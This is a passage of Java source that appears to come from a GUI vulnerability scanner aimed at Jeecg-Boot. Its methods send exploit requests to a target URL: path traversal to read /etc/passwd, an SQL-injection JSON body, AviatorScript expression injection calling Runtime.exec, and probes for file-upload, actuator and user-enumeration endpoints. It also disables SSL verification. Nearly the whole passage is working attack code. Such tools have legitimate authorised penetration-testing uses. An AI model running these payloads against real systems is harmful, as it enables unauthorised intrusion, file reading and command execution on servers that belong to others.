                output.appendText(formattedDateTime + url + "[+++]可能存在Jeecg-Boot qurestSql-SQL注入漏洞 poc2\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在Jeecg-Boot qurestSql-SQL注入漏洞-poc2\n");
        }
    }
    public void jeecgipload(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/commonController.do?upload");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                String jsonStr = response.toString();
                JSONObject jsonObject = JSONObject.fromObject(jsonStr);
                int age = jsonObject.optInt("code");

                if (age == 405) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot commonController 任意文件上传漏洞\n");
                    output.appendText(url + "/api/../commonController.do?parserXml\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot commonController 任意文件上传漏洞-\n");
        }
    }
    public void jeecgload1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jmreport/upload");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            int age = jsonObject.optInt("code");

            if (age == 405) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot jmreport任意文件上传漏洞 poc2\n");
                output.appendText(url + "/jmreport/upload\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot jmreport任意文件上传漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot jmreport任意文件上传漏洞-poc2\n");
        }
    }
    public void jeecgusergfhf(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/sys/user/checkOnlyUser?username=admin");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            int age = jsonObject.optInt("code");

            if (age == 0) {
                output.appendText("\n" + formattedDateTime + url + "[+]存在jeecg-boot-checkOnlyUser信息泄露漏洞 poc1\n");
                output.appendText(url + "/jeecg-boot/sys/user/checkOnlyUser?username=admin\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText("\n" + formattedDateTime + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞-poc1");
        }
    }
    public void jeecggfh1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/sys/user/checkOnlyUser?username=admin");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                String jsonStr = response.toString();
                JSONObject jsonObject = JSONObject.fromObject(jsonStr);
                int age = jsonObject.optInt("code");

                if (age == 0) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-checkOnlyUser信息泄露漏洞 poc2\n");
                    output.appendText(url + "/sys/user/checkOnlyUser?username=admin\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞 poc2\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞-poc2\n");
        }
    }
    public void jeecghttp(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/actuator/httptrace/");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("x-real-ip")) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-httptrace信息泄露漏洞 poc1\n");
                output.appendText(url + "/jeecg-boot/actuator/httptrace/\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-httptrace信息泄露漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-httptrace信息泄露漏洞-poc1\n");
        }
    }
    public void jeecghttp1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/actuator/httptrace/");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("x-real-ip")) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-httptrace信息泄露漏洞 poc2\n");
                output.appendText(url + "/actuator/httptrace/\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-httptrace信息泄露漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-httptrace信息泄露漏洞-poc2\n");
        }
    }
    public void jeecgxiazai(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/commonController.do?downloadFile&filePath=../../../../../../../../../../../../etc/passwd");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("root:")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-任意文件下载漏洞\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-任意文件下载漏洞\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-任意文件下载漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-任意文件下载漏洞-\n");
        }
    }
    public void jeecgdsf(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/api/../jeecgFormDemoController.do?interfaceTest=");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("success")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-jeecgFormDemoController漏洞\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-jeecgFormDemoController漏洞\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-jeecgFormDemoController漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-jeecgFormDemoController漏洞-\n");
        }
    }
    public void jeecgapi(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/api-docs");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("swagger")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 api接口信息泄露 poc1\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 api接口信息泄露 poc1\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 api接口信息泄露 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 api接口信息泄露-poc1\n");
        }
    }
    public void jeecgapi1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/swagger-ui.html");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("swagger")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 api接口信息泄露 poc2\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 api接口信息泄露 poc2\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 api接口信息泄露 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 api接口信息泄露-poc2\n");
        }
    }
    public void jeecgp3(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/p3/biz/chat/chatHistory");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("success")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 P3 Biz Chat任意文件读取漏洞-\n");
        }
    }
    public void jeecgsys(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/sys/duplicate/check");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("success")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 sys/duplicate/check注入漏洞 poc1\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 sys/duplicate/check注入漏洞 poc1\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 sys/duplicate/check注入漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 sys/duplicate/check注入漏洞-poc1\n");
        }
    }
    public void jeecgsys1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/sys/duplicate/check");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setRequestProperty("Content-Type", "application/json");

            String json = "{\"tableName\":\"sys_user\",\"fieldName\":\"username\",\"fieldVal\":\"admin' or '1'='1\"}";
            connection.setDoOutput(true);

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("success")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 sys/duplicate/check注入漏洞 poc2\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 sys/duplicate/check注入漏洞 poc2\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 sys/duplicate/check注入漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 sys/duplicate/check注入漏洞-poc2\n");
        }
    }
    public void jeecgbiaoda(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/sys/duplicate/check");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setRequestProperty("Content-Type", "application/json");

            String json = "{\"tableName\":\"sys_user\",\"fieldName\":\"username\",\"fieldVal\":\"${@java.lang.Runtime@getRuntime().exec('echo 999999')}\"}";
            connection.setDoOutput(true);

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("999999")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 AviatorScript表达式注入漏洞 poc1\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 AviatorScript表达式注入漏洞 poc1\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 AviatorScript表达式注入漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 AviatorScript表达式注入漏洞-poc1\n");
        }
    }
    public void jeecgbiaoda1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/v2/sys/duplicate/check");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setRequestProperty("Content-Type", "application/json");

            String json = "{\"tableName\":\"sys_user\",\"fieldName\":\"username\",\"fieldVal\":\"${@java.lang.Runtime@getRuntime().exec('echo 888888')}\"}";
            connection.setDoOutput(true);

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer response = new StringBuffer();
                response.append(br.readLine());

                String inputLine;
                while ((inputLine = br.readLine()) != null) {
                    response.append(inputLine);
                }

                if (response.toString().contains("888888")) {
                    output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-v2 AviatorScript表达式注入漏洞 poc2\n");
                } else {
                    output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 AviatorScript表达式注入漏洞 poc2\n");
                }
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-v2 AviatorScript表达式注入漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-v2 AviatorScript表达式注入漏洞-poc2\n");
        }
    }
    public void jeecgqueryudfsdf(String url, String path, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            if (path.endsWith("/")) {
                path = path.substring(0, path.length() - 1);
            }

            if (path.endsWith("'")) {
                path = path.substring(0, path.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/" + path + "/sys/user/querySysUser?username=admin");
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            int age = jsonObject.optInt("code");
            if (age == 0) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-querySysUser信息泄露漏洞\n");
                output.appendText(formattedDateTime + url + "/" + path.replaceAll("'", "") + "/sys/user/querySysUser?username=admin\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞-\n");
        }
    }

    public void jeecgdsfsfs(String url, String path, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            if (path.endsWith("/")) {
                path = path.substring(0, path.length() - 1);
            }

            if (path.endsWith("'")) {
                path = path.substring(0, path.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/" + path + "/sys/user/checkOnlyUser?username=admin");
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            int age = jsonObject.optInt("code");
            if (age == 0) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-checkOnlyUser信息泄露漏洞\n");
                output.appendText(formattedDateTime + url + "/" + path + "/sys/user/checkOnlyUser?username=admin\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-checkOnlyUser信息泄露漏洞-\n");
        }
    }

    public void zidingyi(String url, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
